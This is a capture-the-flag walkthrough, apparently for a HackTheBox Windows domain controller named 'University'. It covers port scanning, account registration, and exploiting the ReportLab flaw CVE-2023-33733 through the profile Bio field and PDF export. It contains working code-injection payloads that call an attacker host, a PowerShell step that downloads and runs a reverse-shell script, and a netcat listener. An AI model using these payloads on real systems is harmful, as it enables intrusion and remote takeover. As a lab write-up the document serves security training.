![image](https://github.com/user-attachments/assets/9d5ed6d1-39f1-4b0c-a85c-b3e794e4048c)

## 1. Recon

### 1.1. Port Scan `nmap`

```console
root@kali:~# nmap -Pn -A 10.10.11.39
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 12:45 +08
Nmap scan report for 10.10.11.39
Host is up (0.0046s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://university.htb/
|_http-server-header: nginx/1.24.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-27 11:30:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: university.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/27%OT=53%CT=1%CU=36551%PV=Y%DS=2%DC=T%G=Y%TM=676
OS:E311C%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S
OS:%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW
OS:8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-27T11:31:16
|_  start_date: N/A
|_clock-skew: 6h45m06s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 199/tcp)
HOP RTT     ADDRESS
1   4.64 ms 10.10.14.1
2   4.70 ms 10.10.11.39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.48 seconds
```

The target machine appears to be a domain controller, let's add the hosts records to Kali:

```sh
cat << EOF >> /etc/hosts
10.10.11.39 university.htb
10.10.11.39 university.htb0
EOF
```

## 2. Exploring

### 2.1. `80`

![image](https://github.com/user-attachments/assets/c54bf4a1-72f9-4ee4-b924-34f3856fe4d5)

User login to the site accepts password and signed certificate methods, and there are `Student` and `Professor` account types for registration

![image](https://github.com/user-attachments/assets/61c6deb6-8e94-4589-9df9-079518404561)

![image](https://github.com/user-attachments/assets/f191adcf-2642-4f8d-9c7b-077186c911bc)

`Professor` registration requires review and approval

![image](https://github.com/user-attachments/assets/4d898275-f86d-4486-81fc-6a70f6329564)

Let's register for a `Student` account

![image](https://github.com/user-attachments/assets/a357d888-67cc-4e84-8f88-1a89388fdea0)

The registered `Student` account is immediately usable for login

![image](https://github.com/user-attachments/assets/2e6b4626-b602-4087-b1d4-f968de386b81)

While testing each field in the profile, it seems that the Bio changes `<script>alert(123)</script>` to just `alert(123)`

→ the site may be susceptible to cross-site scripting

![image](https://github.com/user-attachments/assets/50b9f588-5b7d-43fc-a8af-293e4253d796)

### 2.2. Getting a reverse shell

Some searching shows that this (https://github.com/c53elyas/CVE-2023-33733) may be the vulnerability 

PoC code, replace `curl http://xxx.xxx.xxx.xxx/` with the code to be executed

```xml
<para>
  <font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://xxx.xxx.xxx.xxx/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
    exploit
  </font>
</para>
```

There's a reverse shell PowerShell script in this repo that should work: https://github.com/joetanx/ctf/blob/main/reverse.ps1

Prepare Kali

```sh
curl -sLo /var/www/html/reverse.ps1 https://github.com/joetanx/ctf/raw/main/reverse.ps1
sed -i 's/<ADDRESS>/10.10.14.35/' /var/www/html/reverse.ps1
sed -i 's/<PORT>/4444/' /var/www/html/reverse.ps1
```

Start console:

```sh
root@kali:~# rlwrap nc -nvlp 4444
listening on [any] 4444 ...
```

Edit the PoC code to this:

```xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

> [!Note]
>
> `powershell Invoke-WebRequest -Uri http://10.10.14.35/reverse.ps1 -OutFile ./reverse.ps1'`
>
> Downloads the reverse shell script

Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)

![image](https://github.com/user-attachments/assets/50a1aa58-9945-4db2-a1fe-208b2d04e0b0)

Next, edit the PoC code to this:

```xml
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./reverse.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>
```

> [!Note]
>
> `powershell ./reverse.ps1`
>
> Runs the reverse shell script

Put into the Bio editor, submit, then select profile export (it is the html to pdf generator that would execute the command)

![image](https://github.com/user-attachments/assets/59d24bed-ca36-4fdf-b3f5-ed1246da4534)

Reverse shell hooked as `university\wao` account

```pwsh
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.11.39] 62164

PS C:\Web\University> whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
university\wao S-1-5-21-2056245889-740706773-2266349663-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
UNIVERSITY\Web Developers                  Group            S-1-5-21-2056245889-740706773-2266349663-1129 Mandatory group, Enabled by default, Enabled group
Service asserted identity                  Well-known group S-1-18-2                                      Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
